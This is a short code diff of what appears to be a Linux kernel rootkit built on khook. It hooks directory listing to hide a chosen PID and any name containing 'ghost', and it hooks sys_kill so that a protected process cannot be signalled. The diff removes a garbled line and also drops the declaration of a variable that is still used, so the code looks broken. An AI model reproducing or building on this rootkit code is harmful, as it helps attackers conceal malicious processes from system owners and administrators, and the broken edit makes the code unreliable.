@@ -78,7 +78,6 @@ static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offse
 	char *endp;
 	long pid;
 	int ret = 0;
-	=-1;
 	hidden_pid=find_pid(hide);
 	pid = simple_strtol(name, &endp, 10);
 	if (pid != hidden_pid && !strstr(name, "ghost"))
@@ -135,7 +134,6 @@ static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
 KHOOK_EXT(long, sys_kill, pid_t, int);
 static long khook_sys_kill(pid_t pid, int sig) {
 	int ret = 0;
-	int protected_pid=-1;
 	protected_pid=find_pid(protected);
 	printk("pid:%d", protected_pid);
 	if (protected_pid != pid)
